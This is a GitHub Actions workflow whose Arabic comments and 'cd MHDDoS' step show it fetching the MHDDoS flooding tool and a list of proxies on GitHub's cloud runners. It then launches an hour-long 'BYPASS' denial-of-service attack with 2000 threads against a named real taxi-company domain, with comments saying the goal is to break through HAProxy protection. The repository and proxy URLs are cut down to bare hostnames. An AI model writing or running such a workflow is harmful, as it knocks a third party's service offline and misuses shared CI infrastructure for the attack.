name: Ultimate Cloud Power
on: [workflow_dispatch]

jobs:
  attack_job:
    runs-on: ubuntu-latest
    steps:
      - name: Launch Bypass Attack
        run: |
          # تحميل الأداة وتثبيت المكتبات مع تجاهل الأخطاء
          git clone --depth 1 https://github.com || true
          cd MHDDoS || exit 1
          pip3 install -r requirements.txt --quiet
          # تحميل بروكسيات "حية" الآن
          curl -s https://githubusercontent.com > proxy.txt
          # تشغيل هجوم الـ BYPASS (تجاوز الحماية)
          # سنستخدم 2000 مسار لكسر حماية HAProxy
          python3 start.py BYPASS https://a2ztaxi.uk 5 2000 proxy.txt 100 3600
